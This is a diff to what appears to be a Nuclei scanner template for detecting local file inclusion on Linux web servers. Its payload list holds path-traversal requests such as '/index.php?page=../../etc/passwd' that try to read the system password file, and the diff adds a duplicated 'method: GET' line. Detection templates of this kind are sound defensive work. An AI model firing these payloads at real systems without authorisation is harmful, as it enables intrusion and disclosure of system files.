@@ -13,7 +13,6 @@ info:
   metadata:
     max-request: 33
   tags: linux,lfi,generic
-
 flow: http(1) && http(2)
 
 http:
@@ -33,9 +32,11 @@ http:
         internal: true
 
   - method: GET
+
   - method: GET
     path:
       - "{{BaseURL}}{{paths}}"
+
     payloads:
       paths:
         - "/etc/passwd"
@@ -70,7 +71,6 @@ http:
         - "/index.php?page=../../etc/passwd"
         - "/index.php?page=....//....//etc/passwd"
         - "/../../../../../../../../../etc/passwd"
-
     stop-at-first-match: true
     matchers:
       - type: regex
